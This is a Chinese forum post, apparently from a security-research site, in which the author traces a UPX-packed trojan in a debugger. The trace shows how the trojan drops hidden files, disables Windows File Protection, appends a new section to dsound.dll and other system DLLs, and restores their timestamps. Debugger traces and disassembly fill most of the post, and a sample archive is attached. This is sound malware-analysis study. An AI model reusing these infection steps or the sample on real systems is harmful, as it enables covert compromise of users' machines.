
# 病毒修改 PE 文件过程

> 原文：`www.pediy.com/kssd/pediy12/134165.html`

之前一直在看雪观望和学习，第一次正式发帖，如有错误和疏忽处还请各位指正。谢谢。

今天分析此病毒主要是目的是熟悉下`PE`结构以及病毒是如果修改它的。本人只看过老罗的`PE`知识，没有实战过，今天的分析加深了对`PE`的了解，希望对和我一样刚接触`PE`的新手有所帮助。高手见笑，请绕道。

病毒加了`UPX`壳，直接`ctrl+f`搜索`popad`到达`OEP`，病毒主体只是做了调用`sfc_os.dll` 5 号函数，解除`windows`文件保护，修改`dsound.dll`，`ddraw.dll`和`comres.dll`这 3 个文件，病毒主要功能和完成目的在这修改后的几个`dll`中。

1，病毒首先拷贝释放文件到`C:\WINDOWS\system32\1008.ocx`，`elementclientwl01.ocx`
2，复制一份`dsound.dll`到`New.dll`。
3，获得`dsound.dll` `PE`头信息和和节表内容到缓冲区。
4，在节表最后增加一个`idata2`节，并修改`PE`文件头，重新填回`New.dll`，
5，突破系统文件保护，备份`dsound.dll`，拷贝`new.dll`为`dsound.dll`. 其它两个文件类似过程。

`dsound.dll`，`ddraw.dll`和`comres.dll`文件是很多游戏必须加载的这样就可以达到病毒作者的目的。

`dll`文件明天继续分析。

分析过程如下，

代码:



## 1. 尝试移动文件

```
//尝试移动 1008.ocx 到 temp 下，此时不存在此文件，执行失败。
0012F988   0040224E  /CALL 到 MoveFileExA 来自 Trojan_W.00402248
0012F98C   0012FBC4  |ExistingName = "C:\WINDOWS\system32\1008.ocx"
0012F990   0012FAC0  |NewName = "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\120bd2awltmp.dat"(120bd2a 为随机)
0012F994   00000001  \Flags = REPLACE_EXISTING
```
返回 `0`。

```
00401007    FF15 20304000   call    dword ptr [403020]                ; kernel32.GetModuleHandleA
```
返回：`00400000`

```
0012F968   00401025  /CALL 到 FindResourceA 来自 Trojan_W.0040101F
0012F96C   00400000  |hModule = 00400000 (Trojan_W)
0012F970   0000006C  |ResourceName = 6C
0012F974   00404000  \ResourceType = "DLL"
```
返回：`0040F078`

```
00401044    FF15 14304000   call    dword ptr [<&kernel32.LockResour>; kernel32.SetHandleCount
0040104A    8BE8            mov     ebp, eax                     ; test.0040B290 //指向一个 PE 文件数据的起始处
```

## 2. 创建文件 `C:\WINDOWS\system32\1008.ocx`

```
ESP ==>  > 00401083  /CALL 到 CreateFileA 来自 test.0040107D
ESP+4    > 0012FBC4  |FileName = "C:\WINDOWS\system32\1008.ocx"
ESP+8    > 40000000  |Access = GENERIC_WRITE
ESP+C    > 00000003  |ShareMode = FILE_SHARE_READ|FILE_SHARE_WRITE
ESP+10   > 00000000  |pSecurity = NULL
ESP+14   > 00000002  |Mode = CREATE_ALWAYS
ESP+18   > 00000000  |Attributes = 0
ESP+1C   > 00000000  \hTemplateFile = NULL
```
返回：`00000044`

### 2.1 设置当前内存地址 `40B290`

```
ESP ==>  > 004010A1  /CALL 到 SetHandleCount 来自 test.0040109B
ESP+4    > 0040B290  \nHandles = 40B290 (4240016.)
```
返回：`40B290`

### 2.2 写入数据到 `1008.ocx`

把 `40b290` 处 `1800H` 字节的数据写入 `1008.ocx`。

```
ESP ==>  > 004010A9  /CALL 到 WriteFile 来自 test.004010A3
ESP+4    > 00000044  |hFile = 00000044 (window)
ESP+8    > 0040B290  |Buffer = test.0040B290
ESP+C    > 00001800  |nBytesToWrite = 1800 (6144.)
ESP+10   > 0012F988  |pBytesWritten = 0012F988
ESP+14   > 00000000  \pOverlapped = NULL
```

### 2.3 设置隐藏属性

```
ESP ==>  > 004010C3  /CALL 到 SetFileAttributesA 来自 test.004010BD
ESP+4    > 0012FBC4  |FileName = "C:\WINDOWS\system32\1008.ocx"
ESP+8    > 00000006  \FileAttributes = HIDDEN|SYSTEM
```

## 3. 创建文件 `C:\WINDOWS\system32\elementclientwl01.ocx`

```
ESP ==>  > 00401083  /CALL 到 CreateFileA 来自 test.0040107D
ESP+4    > 0012FBC4  |FileName = "C:\WINDOWS\system32\elementclientwl01.ocx"
ESP+8    > 40000000  |Access = GENERIC_WRITE
ESP+C    > 00000003  |ShareMode = FILE_SHARE_READ|FILE_SHARE_WRITE
ESP+10   > 00000000  |pSecurity = NULL
ESP+14   > 00000002  |Mode = CREATE_ALWAYS
ESP+18   > 00000000  |Attributes = 0
ESP+1C   > 00000000  \hTemplateFile = NULL
```

### 3.1 设置当前内存地址 `405090`

```
ESP ==>  > 0040104A  /CALL 到 SetHandleCount 来自 test.00401044
ESP+4    > 00405090  \nHandles = 405090 (4214928.)
```

### 3.2 写入数据到 `elementclientwl01.ocx`

把 `00405090` 处 `6200H` 字节的数据写入 `elementclientwl01.ocx` 并设置文件为隐藏属性。

```
ESP ==>  > 004010A9  /CALL 到 WriteFile 来自 test.004010A3
ESP+4    > 00000044  |hFile = 00000044 (window)
ESP+8    > 00405090  |Buffer = test.00405090
ESP+C    > 00006200  |nBytesToWrite = 6200 (25088.)
ESP+10   > 0012F988  |pBytesWritten = 0012F988
ESP+14   > 00000000  \pOverlapped = NULL
```

## 4. 获取模块文件名

```
0012F3A4   004010EB  /CALL 到 GetModuleFileNameA 来自 test.004010E5
0012F3A8   00000000  |hModule = NULL
0012F3AC   0012F3C4  |PathBuffer = 0012F3C4
0012F3B0   00000104  \BufSize = 104 (260.)
```
返回：`0000000B`

## 5. 打开病毒源程序

```
0012F394   00401107  /CALL 到 CreateFileA 来自 test.00401105
0012F398   0012F3C4  |FileName = "C:\test.exe"
0012F39C   80000000  |Access = GENERIC_READ
0012F3A0   00000003  |ShareMode = FILE_SHARE_READ|FILE_SHARE_WRITE
0012F3A4   00000000  |pSecurity = NULL
0012F3A8   00000003  |Mode = OPEN_EXISTING  //打开已经存在的文件，如果不存在失败。
0012F3AC   00000000  |Attributes = 0
0012F3B0   00000000  \hTemplateFile = NULL
```
返回：`00000044`

### 5.1 设置文件指针

设置文件指针为倒数 `4C8H` 字节处。

```
0012F39C   00401127  /CALL 到 SetFilePointer 来自 test.00401125
0012F3A0   00000044  |hFile = 00000044 (window)
0012F3A4   FFFFFB38  |OffsetLo = FFFFFB38 (-1224.)
0012F3A8   00000000  |pOffsetHi = NULL
0012F3AC   00000002  \Origin = FILE_END
```
返回文件当前指针：`00010138`

### 5.2 读取数据

读取从倒数 `4c8H` 字节处开始直到文件末尾处到 `buffer 0012F4C8` 中。

```
0012F398   00401142  /CALL 到 ReadFile 来自 test.0040113C
0012F39C   00000044  |hFile = 00000044 (window)
0012F3A0   0012F4C8  |Buffer = 0012F4C8
0012F3A4   000004C8  |BytesToRead = 4C8 (1224.)
0012F3A8   0012F3C0  |pBytesRead = 0012F3C0
0012F3AC   00000000  \pOverlapped = NULL
```

## 6. 打开 `elementclientwl01.ocx`

```
0012F390   0040115B  /CALL 到 CreateFileA 来自 test.00401159
0012F394   0012FBC4  |FileName = "C:\WINDOWS\system32\elementclientwl01.ocx"
0012F398   C0000000  |Access = GENERIC_READ|GENERIC_WRITE
0012F39C   00000003  |ShareMode = FILE_SHARE_READ|FILE_SHARE_WRITE
0012F3A0   00000000  |pSecurity = NULL
0012F3A4   00000003  |Mode = OPEN_EXISTING
0012F3A8   00000000  |Attributes = 0
0012F3AC   00000000  \hTemplateFile = NULL
```
返回：`00000034`

### 6.1 设置文件指针

```
0012F39C   0040116E  /CALL 到 SetFilePointer 来自 test.0040116C
0012F3A0   00000034  |hFile = 00000034 (window)
0012F3A4   000004C8  |OffsetLo = 4C8 (1224.)
0012F3A8   00000000  |pOffsetHi = NULL
0012F3AC   00000002  \Origin = FILE_END
```
返回文件指针：`000066C8`

### 6.2 写入数据

把刚才病毒源程序中读取到的末尾 `4c8H` 字节写入 `elementclientwl01.ocx` 偏移 `000066C8` 处。

```
0012F398   00401189  /CALL 到 WriteFile 来自 test.00401183
0012F39C   00000034  |hFile = 00000034 (window)
0012F3A0   0012F4C8  |Buffer = 0012F4C8
0012F3A4   000004C8  |nBytesToWrite = 4C8 (1224.)
0012F3A8   0012F3C0  |pBytesWritten = 0012F3C0
0012F3AC   00000000  \pOverlapped = NULL
```

关闭以上两个文件句柄。

## 7. 创建配置文件

创建 `C:\WINDOWS\system32\system.ini` 配置文件，写入以下内容：

```ini
[asp]
key=3
```

```
0012F984   00402347  /CALL 到 WritePrivateProfileStringA 来自 test.00402341
0012F988   004040F0  |Section = "asp"
0012F98C   004040F4  |Key = "key"
0012F990   004040EC  |String = "3"
0012F994   0012F9BC  \FileName = "C:\WINDOWS\system32\system.ini"
```
返回：`00000001`

## 8. 处理 `dsound.dll`

尝试打开 `dsound.dll`。

```
0012F534   00401615  /CALL 到 CreateFileA 来自 test.0040160F
0012F538   0012F560  |FileName = "C:\WINDOWS\system32\dsound.dll"
0012F53C   80000000  |Access = GENERIC_READ
0012F540   00000001  |ShareMode = FILE_SHARE_READ
0012F544   00000000  |pSecurity = NULL
0012F548   00000003  |Mode = OPEN_EXISTING
0012F54C   00000000  |Attributes = 0
0012F550   00000000  \hTemplateFile = NULL
```
返回：`00000044`
接着关闭句柄

打开成功则执行以下步骤

### 8.1 生成 `New.dll` 文件

拷贝生成 `New.dll` 文件。

```
0012F544   004017C3  /CALL 到 CopyFileA 来自 test.004017BD
0012F548   0012F560  |ExistingFileName = "C:\WINDOWS\system32\dsound.dll"
0012F54C   0012F5E0  |NewFileName = "C:\WINDOWS\system32\New.dll"
0012F550   00000000  \FailIfExists = FALSE
```

### 8.2 再次打开 `dsound.dll`

```
0012F534   004017F8  /CALL 到 CreateFileA 来自 test.004017F2
0012F538   0012F560  |FileName = "C:\WINDOWS\system32\dsound.dll"
0012F53C   80000000  |Access = GENERIC_READ
0012F540   00000001  |ShareMode = FILE_SHARE_READ
0012F544   00000000  |pSecurity = NULL
0012F548   00000003  |Mode = OPEN_EXISTING
0012F54C   00000000  |Attributes = 0
0012F550   00000000  \hTemplateFile = NULL
```
返回：`00000034`

### 8.3 定位 PE 头

设置文件指针为 `3cH` 处，用 `winhex` 打开 `dsound.dll` 查看此位置其实为 DOS 头 `IMAGE_DOS_HEADER_ENDS` 结构中 `e_lfanew` 值，即指向真正的 PE 头的位置。

```
0012F540   00401811  /CALL 到 SetFilePointer 来自 test.0040180B
0012F544   00000034  |hFile = 00000034 (window)
0012F548   0000003C  |OffsetLo = 3C (60.)
0012F54C   00000000  |pOffsetHi = NULL
0012F550   00000000  \Origin = FILE_BEGIN
```

获得当前文件内容指针 `4` 字节。返回到 `buffer` 中的值为 `E8`，此值即是 PE 头的位置。

```
0012F53C   0040183A  /CALL 到 ReadFile 来自 test.00401834
0012F540   00000034  |hFile = 00000034
0012F544   0012F704  |Buffer = 0012F704 //返回 000000E8
0012F548   00000004  |BytesToRead = 4
0012F54C   0012F754  |pBytesRead = 0012F754 
0012F550   00000000  \pOverlapped = NULL
```

设置文件指针到 PE 头位置。

```
0012F540   00401852  /CALL 到 SetFilePointer 来自 test.0040184C
0012F544   00000034  |hFile = 00000034
0012F548   000000E8  |OffsetLo = E8 (232.)
0012F54C   00000000  |pOffsetHi = NULL
0012F550   00000000  \Origin = FILE_BEGIN
```
返回：`000000E8`

### 8.4 读取 PE 头和节表信息

读取从 PE 头开始的 `F8h` 个字节。//这个大小正好是 PE 头的 `18h` 个字节加上可选头的 `E0h` 个字节，`18h+E0h = F8h`

```
0012F53C   00401874  /CALL 到 ReadFile 来自 test.0040186E
0012F540   00000034  |hFile = 00000034 (window)
0012F544   0012F768  |Buffer = 0012F768
0012F548   000000F8  |BytesToRead = F8 (248.)
0012F54C   0012F754  |pBytesRead = 0012F754
0012F550   00000000  \pOverlapped = NULL
```

设置指针为 `1E0h` 处。此处为节表 `IMAGE_SECTION_HEADER` 处。

```
0012F540   004018D3  /CALL 到 SetFilePointer 来自 test.004018CD
0012F544   00000034  |hFile = 00000034
0012F548   000001E0  |OffsetLo = 1E0 (480.)
0012F54C   00000000  |pOffsetHi = NULL
0012F550   00000000  \Origin = FILE_BEGIN
```

从节表起始位置起读取 `28H` 字节数据到 `buffer:0012F720`。此处其实为 `.text` 节大小。

```
0012F53C   0040191B  /CALL 到 ReadFile 来自 test.00401915
0012F540   00000034  |hFile = 00000034
0012F544   0012F720  |Buffer = 0012F720
0012F548   00000028  |BytesToRead = 28 (40.)
0012F54C   0012F754  |pBytesRead = 0012F754
0012F550   00000000  \pOverlapped = NULL
```

循环读取其余节表到各自(`dsound.dll` 有 4 个节表)。 //这里注意下，节表起始位置为 `1E0h`,每个节的大小为 `28H`，一共是 4 个节表，那么我们算出

读取完毕后，文件指针的位置为：`1E0h+28h*4 =1E0h + A0h = 280H` (这里是十六进制相乘仔细点，我开始数错了 >_<) ,这里埋下伏笔,一会要用到。- -

### 8.5 打开 `new.dll`

```
EBP-458  > 00401939  /CALL 到 CreateFileA 来自 test.00401933
EBP-454  > 0012F5E0  |FileName = "C:\WINDOWS\system32\New.dll"
EBP-450  > 001F01FF  |Access = 1F01FF
EBP-44C  > 00000003  |ShareMode = FILE_SHARE_READ|FILE_SHARE_WRITE
EBP-448  > 00000000  |pSecurity = NULL
EBP-444  > 00000003  |Mode = OPEN_EXISTING
EBP-440  > 00000000  |Attributes = 0
EBP-43C  > 00000000  \hTemplateFile = NULL
```
返回值：`00000044`

设置文件指针到 `New.dll` 末尾

```
EBP-44C  > 00401AF9  /CALL 到 SetFilePointer 来自 test.00401AF3
EBP-448  > 00000044  |hFile = 00000044 (window)
EBP-444  > 00000000  |OffsetLo = 0
EBP-440  > 00000000  |pOffsetHi = NULL
EBP-43C  > 00000002  \Origin = FILE_END
```
返回：`00059C00`

把病毒源程序偏移 `00001961` 处 1 字节数据加入 `New.dll` 末尾(此值为 `80h`)。

```
EBP-450  > 00401B47  /CALL 到 WriteFile 来自 test.00401B41
EBP-44C  > 00000044  |hFile = 00000044 (window)
EBP-448  > 00401961  |Buffer = test.00401961 //经过 RVA 到文件中实际地址的计算，刚好也是在偏移 1961 处。
EBP-444  > 00000001  |nBytesToWrite = 1
EBP-440  > 0012F748  |pBytesWritten = 0012F748
EBP-43C  > 00000000  \pOverlapped = NULL
```

把病毒源程序(test 为病毒名)偏移 `00001961` 开始的 `137h` 个字节增加到 `new.dll` 末尾。

```
00401AE6    6A 02           push    2
00401AE8    6A 00           push    0
00401AEA    6A 00           push    0
00401AEC    8B8D D4FEFFFF   mov     ecx, dword ptr [ebp-12C]
00401AF2    51              push    ecx
0401AF3     FF15 28304000   call    dword ptr [<&kernel32.SetFilePoi>; kernel32.SetFilePointer
00401AF9    C785 7CFDFFFF 0>mov     dword ptr [ebp-284], 0
00401B03    EB 0F           jmp     short 00401B14
00401B05    8B95 7CFDFFFF   mov     edx, dword ptr [ebp-284]
00401B0B    83C2 01         add     edx, 1
00401B0E    8995 7CFDFFFF   mov     dword ptr [ebp-284], edx
00401B14    8B85 7CFDFFFF   mov     eax, dword ptr [ebp-284]
00401B1A    3B85 58FDFFFF   cmp     eax, dword ptr [ebp-2A8] //堆栈 ss:[0012F6E4]=00000137 ，137 即为需要读取的字节数。
00401B20    7D 27           jge     short 00401B49  //如果读够则跳到 00401B49。
00401B22    6A 00           push    0
00401B24    8D8D BCFDFFFF   lea     ecx, dword ptr [ebp-244]
00401B2A    51              push    ecx
00401B2B    6A 01           push    1
00401B2D    8B95 D8FDFFFF   mov     edx, dword ptr [ebp-228]
00401B33    0395 7CFDFFFF   add     edx, dword ptr [ebp-284]
00401B39    52              push    edx
00401B3A    8B85 D4FEFFFF   mov     eax, dword ptr [ebp-12C]
00401B40    50              push    eax
00401B41    FF15 04304000   call    dword ptr [<&kernel32.WriteFile>>; kernel32.WriteFile
00401B47   ^ EB BC          jmp     short 00401B05
00401B49    8B8D 50FCFFFF   mov     ecx, dword ptr [ebp-3B0]
```

继续在 `new.dll` 文件末尾增加内容。

```
EBP-450  > 00401BAD  /CALL 到 WriteFile 来自 test.00401BA7
EBP-44C  > 00000044  |hFile = 00000044 (window)
EBP-448  > 0012F6F4  |Buffer = 0012F6F4 //Buffer：0012F74C、0012F758
EBP-444  > 00000004  |nBytesToWrite = 4
EBP-440  > 0012F748  |pBytesWritten = 0012F748
EBP-43C  > 00000000  \pOverlapped = NULL
```

继续通过多次调用 `WriteFile` 增加内容到 `new.dll` 末尾。

### 8.6 循环写入数据

循环 29h 次增加类似"1000.","1001.",……,"1028."的数据到 `new.dll` 末尾

```
00401C81    8B8D 7CFDFFFF   mov     ecx, dword ptr [ebp-284]
00401C87    83C1 01         add     ecx, 1
00401C8A    898D 7CFDFFFF   mov     dword ptr [ebp-284], ecx
00401C90    83BD 7CFDFFFF 2>cmp     dword ptr [ebp-284], 28
00401C97    0F8F 82000000   jg      00401D1F
00401C9D    8B95 7CFDFFFF   mov     edx, dword ptr [ebp-284]
00401CA3    81C2 00100000   add     edx, 1000
00401CA9    52              push    edx
00401CAA    68 80404000     push    00404080                         ; ASCII "%04x"
00401CAF    8D85 CCFDFFFF   lea     eax, dword ptr [ebp-234]
00401CB5    50              push    eax
00401CB6    FF15 90304000   call    dword ptr [<&MSVCRT.sprintf>]    ; MSVCRT.sprintf//类似"1000.","1001.",……,"1028."的数据
00401CBC    83C4 0C         add     esp, 0C
00401CBF    6A 00           push    0
00401CC1    8D8D BCFDFFFF   lea     ecx, dword ptr [ebp-244]
00401CC7    51              push    ecx
00401CC8    6A 04           push    4
00401CCA    8D95 CCFDFFFF   lea     edx, dword ptr [ebp-234]
00401CD0    52              push    edx
00401CD1    8B85 D4FEFFFF   mov     eax, dword ptr [ebp-12C]
00401CD7    50              push    eax
00401CD8    FF15 04304000   call    dword ptr [<&kernel32.WriteFile>>; kernel32.WriteFile
00401CDE    6A 00           push    0
00401CE0    8D8D BCFDFFFF   lea     ecx, dword ptr [ebp-244]
00401CE6    51              push    ecx
00401CE7    6A 04           push    4
00401CE9    8D95 D4FDFFFF   lea     edx, dword ptr [ebp-22C]
00401CEF    52              push    edx
00401CF0    8B85 D4FEFFFF   mov     eax, dword ptr [ebp-12C]
00401CF6    50              push    eax
00401CF7    FF15 04304000   call    dword ptr [<&kernel32.WriteFile>>; kernel32.WriteFile
00401CFD    6A 00           push    0
00401CFF    8D8D BCFDFFFF   lea     ecx, dword ptr [ebp-244]
00401D05    51              push    ecx
00401D06    6A 08           push    8
00401D08    68 54424000     push    00404254
00401D0D    8B95 D4FEFFFF   mov     edx, dword ptr [ebp-12C]
00401D13    52              push    edx
00401D14    FF15 04304000   call    dword ptr [<&kernel32.WriteFile>>; kernel32.WriteFile
00401D1A   ^ E9 62FFFFFF    jmp     00401C81
```

继续把病毒源程序(test 为病毒名)偏移 `00004250` 开始的 `2a9h` 个字节增加到 `new.dll` 末尾。

设置 `new.dll` 文件内容指针到 `280h` 处。

```
ESP ==>  > 00401E19  /CALL 到 SetFilePointer 来自 test.00401E13
ESP+4    > 00000044  |hFile = 00000044 (window)
ESP+8    > 00000280  |OffsetLo = 280 (640.)
ESP+C    > 00000000  |pOffsetHi = NULL
ESP+10   > 00000000  \Origin = FILE_BEGIN
```

`280H`?还记得吗？就是在 4 个节表的最后。那么它这么干的意思大概就是想增加个节，然后再看 `0012F964` 中的内容（见下面），果然是。

```
ESP ==>  > 00401E35  /CALL 到 WriteFile 来自 test.00401E2F
ESP+4    > 00000044  |hFile = 00000044 (window)
ESP+8    > 0012F964  |Buffer = 0012F964
ESP+C    > 00000028  |nBytesToWrite = 28 (40.)
ESP+10   > 0012F748  |pBytesWritten = 0012F748
ESP+14   > 00000000  \pOverlapped = NULL
```

`0012F964` 中的内容。

```
0012F964  2E 64 61 74 61 32 00 00  .data2..
0012F96C  00 10 00 00 00 C0 05 00  ....?.   //节大小为 1000H,RVA 为 05C000H
0012F974  00 04 00 00 00 9C 05 00  ....?.   //RAW 为 400H, RAW 偏移为 059c00H
0012F97C  00 00 00 00 00 00 00 00  ........
0012F984  00 00 00 00 60 00 00 E0  ....`..
```

还要加东西啊啊。我都写累了。不过看到了是 `E8h`，我又兴奋了，`E8h`？不就是原始 `dsound.dll` PE 头的位置么？

```
ESP ==>  > 00401E96  /CALL 到 SetFilePointer 来自 test.00401E90
ESP+4    > 00000044  |hFile = 00000044 (window)
ESP+8    > 000000E8  |OffsetLo = E8 (232.)
ESP+C    > 00000000  |pOffsetHi = NULL
ESP+10   > 00000000  \Origin = FILE_BEGIN
```

原来刚才增加了一个节表，而节表的个数是通过 PE 头 `IMAGE_FILE_HEADER` 结构中的 `NumberOfSections` 指定的，之前是 4 个节，现在变 5 个了，所以这里重新写回改变后的 PE 头，主要把 `0012F768`buffer 中的 `NumberOfSections` 由 `0004` 变为 `0005`。（之前在哪里改变了 `0012F768` 中的内容没注意到 >_<）

```
ESP ==>  > 00401EFD  /CALL 到 WriteFile 来自 test.00401EF7
ESP+4    > 00000044  |hFile = 00000044 (window)
ESP+8    > 0012F768  |Buffer = 0012F768 //这个地址是原始 dsound.dll PE 头内容。现在修正后写回到 New.dll 中。
ESP+C    > 000000F8  |nBytesToWrite = F8 (248.)
ESP+10   > 0012F748  |pBytesWritten = 0012F748
```

继续整。设到末尾处……

```
ESP ==>  > 00401F1E  /CALL 到 SetFilePointer 来自 test.00401F18
ESP+4    > 00000044  |hFile = 00000044 (window)
ESP+8    > 00000000  |OffsetLo = 0
ESP+C    > 00000000  |pOffsetHi = NULL
ESP+10   > 00000002  \Origin = FILE_END
```

在 `New.dll` 末尾增加 `0000001`. 终于完了。

```
ESP ==>  > 00401F47  /CALL 到 WriteFile 来自 test.00401F41
ESP+4    > 00000044  |hFile = 00000044 (window)
ESP+8    > 0012F6EC  |Buffer = 0012F6EC //其值为 00000001
ESP+C    > 00000004  |nBytesToWrite = 4
ESP+10   > 0012F748  |pBytesWritten = 0012F748
ESP+14   > 00000000  \pOverlapped = NULL
```

关闭 `New.dll` 句柄。

```
ESP ==>  > 00401F54  /CALL 到 CloseHandle 来自 test.00401F4E
ESP+4    > 00000034  \hObject = 00000034 (window)
//关闭病毒源程序文件句柄。
ESP ==>  > 00401F61  /CALL 到 CloseHandle 来自 test.00401F5B
ESP+4    > 00000044  \hObject = 00000044 (window)
```

### 8.7 解除文件保护

调用 `sfc_os.dll` 5 号函数，解除 windows 文件保护。

```
00401520    56               push    esi
00401521    8B7424 08        mov     esi, dword ptr [esp+8]
00401525    57               push    edi
00401526    56               push    esi
00401527    E8 44FEFFFF      call    00401370
0040152C    8B7C24 18        mov     edi, dword ptr [esp+18]
00401530    83C4 04          add     esp, 4
00401533    6A 01            push    1
```

把 `dsound.dll` 搬走了。

```
ESP ==>  > 0040153D  /CALL 到 MoveFileExA 来自 test.00401537
ESP+4    > 0012F560  |ExistingName = "C:\WINDOWS\system32\dsound.dll"
ESP+8    > 0012F864  |NewName = "C:\WINDOWS\system32\dsound.dll1abe119zl.dat"
ESP+C    > 00000001  \Flags = REPLACE_EXISTING
```

拷贝刚才拼接的 `New.dll` 到 `dsound.dll`. 大功告成了。

```
ESP ==>  > 0040154B  /CALL 到 CopyFileA 来自 test.00401545
ESP+4    > 0012F5E0  |ExistingFileName = "C:\WINDOWS\system32\New.dll"
ESP+8    > 0012F560  |NewFileName = "C:\WINDOWS\system32\dsound.dll"
ESP+C    > 00000000  \FailIfExists = FALSE
```

## 9. 恢复时间戳

打开刚才的 `dsound.dll` 备份。

```
ESP ==>  > 00401495  /CALL 到 CreateFileA 来自 test.00401493
ESP+4    > 0012F864  |FileName = "C:\WINDOWS\system32\dsound.dll1abe119zl.dat"
ESP+8    > 80000000  |Access = GENERIC_READ
ESP+C    > 00000001  |ShareMode = FILE_SHARE_READ
ESP+10   > 00000000  |pSecurity = NULL
ESP+14   > 00000003  |Mode = OPEN_EXISTING
ESP+18   > 00000080  |Attributes = NORMAL
ESP+1C   > 00000000  \hTemplateFile = NULL
```
返回：`00000058`

打开伪装后的的 `dsound.dll`

```
ESP ==>  > 004014AE  /CALL 到 CreateFileA 来自 test.004014AC
ESP+4    > 0012F560  |FileName = "C:\WINDOWS\system32\dsound.dll"
ESP+8    > 10000000  |Access = GENERIC_ALL
ESP+C    > 00000001  |ShareMode = FILE_SHARE_READ
ESP+10   > 00000000  |pSecurity = NULL
ESP+14   > 00000003  |Mode = OPEN_EXISTING
ESP+18   > 00000080  |Attributes = NORMAL
ESP+1C   > 00000000  \hTemplateFile = NULL
```
返回：`00000044`

获得备份的 `dsound.dll` 时间。

```
ESP ==>  > 004014DE  /CALL 到 GetFileTime 来自 test.004014D8
ESP+4    > 00000058  |hFile = 00000058 (window)
ESP+8    > 0012F528  |pCreationTime = 0012F528
ESP+C    > 0012F520  |pLastAccess = 0012F520
ESP+10   > 0012F518  \pLastWrite = 0012F518
```

设置 `dsound.dll` 创建时间和修改时间为上面获得的时间。

```
ESP ==>  > 004014F4  /CALL 到 SetFileTime 来自 test.004014EE
ESP+4    > 00000044  |hFile = 00000044 (window)
ESP+8    > 0012F528  |pCreationTime = 0012F528
ESP+C    > 0012F520  |pLastAccess = 0012F520
ESP+10   > 0012F518  \pLastWrite = 0012F518
```

关闭 `dsound.dll` 句柄

```
ESP ==>  > 0040150A  /CALL 到 CloseHandle 来自 test.00401508
ESP+4    > 00000058  \hObject = 00000058 (window)
```

`dsound.dll` 伪装完毕后，继续伪装 `ddraw.dll` 和 `comres.dll`。




上传的附件

| ![](img/31a2c422ae120fd0b6c241a4e6e83632.jpg) || `testVirus.7z`

 |
